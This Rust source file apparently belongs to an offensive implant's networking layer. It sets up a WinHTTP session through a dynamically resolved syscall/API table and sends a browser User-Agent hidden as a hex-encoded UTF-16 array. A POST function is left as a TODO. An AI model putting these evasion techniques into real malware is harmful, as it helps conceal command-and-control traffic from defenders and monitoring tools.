use core::ffi::c_void;

use crate::core::ssn_table;
use crate::debug;


const WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY: u32 = 4;

type FnWinHttpOpen = unsafe extern "system" fn(
    user_agent: *const u16,   // LPCWSTR
    access_type: u32,
    proxy: *const u16,
    proxy_bypass: *const u16,
    flags: u32,
) -> *mut c_void; // HINTERNET

type FnWinHttpConnect = unsafe extern "system" fn(
    session: *mut c_void,   // HINTERNET
    server: *const u16,     // LPCWSTR
    port: u16,              // INTERNET_PORT
    reserved: u32,
) -> *mut c_void; // HINTERNET

type FnWinHttpCloseHandle = unsafe extern "system" fn(
    handle: *mut c_void,
) -> i32; // BOOL


pub struct HttpSession {
    session_handle: *mut c_void,
    connect_handle: *mut c_void,
    use_https: bool,
}

impl HttpSession {
    pub unsafe fn new(host: &[u16], port: u16, use_https: bool) -> Option<Self> {
        let table = ssn_table::syscall_table();

        if table.win32.winhttp_open.is_null() || table.win32.winhttp_connect.is_null(){
            debug!("[NET] WinHTTP functions are not resolved");
            return None;
        }

        // User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        let user_agent: [u16; 72] = [
            0x004D, 0x006F, 0x007A, 0x0069, 0x006C, 0x006C, 0x0061, 0x002F, // Mozilla/
            0x0035, 0x002E, 0x0030, 0x0020, 0x0028, 0x0057, 0x0069, 0x006E, // 5.0 (Win
            0x0064, 0x006F, 0x0077, 0x0073, 0x0020, 0x004E, 0x0054, 0x0020, // dows NT
            0x0031, 0x0030, 0x002E, 0x0030, 0x003B, 0x0020, 0x0057, 0x0069, // 10.0; Wi
            0x006E, 0x0036, 0x0034, 0x003B, 0x0020, 0x0078, 0x0036, 0x0034, // n64; x64
            0x0029, 0x0020, 0x0041, 0x0070, 0x0070, 0x006C, 0x0065, 0x0057, // ) AppleW
            0x0065, 0x0062, 0x004B, 0x0069, 0x0074, 0x002F, 0x0035, 0x0033, // ebKit/53
            0x0037, 0x002E, 0x0033, 0x0036, 0x0020, 0x0028, 0x004B, 0x0048, // 7.36 (KH
            0x0054, 0x004D, 0x004C, 0x0029, 0x0000, 0x0000, 0x0000, 0x0000, // TML)\0
        ];

        let open_fn: FnWinHttpOpen = core::mem::transmute(table.win32.winhttp_open);
        let session_handle = open_fn(
            user_agent.as_ptr(),
            WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
            core::ptr::null(),
            core::ptr::null(),
            0, // synchronous
        );

        if session_handle.is_null() {
            debug!("[NET] WinHttpOpen failed");
            return None;
        }

        let connect_fn: FnWinHttpConnect = core::mem::transmute(table.win32.winhttp_connect);
        let connect_handle = connect_fn(
            session_handle,
            host.as_ptr(),
            port,
            0,
        );

        if connect_handle.is_null() {
            debug!("[NET] WinHttpConnect failed");
            let close_fn: FnWinHttpCloseHandle = core::mem::transmute(table.win32.winhttp_close_handle);
            close_fn(session_handle);
            return None;
        }

        debug!("[NET] HTTP session established (HTTPS={})", use_https);
        Some(HttpSession{session_handle, connect_handle, use_https})
    }

    // TODO: HTTP POST function
}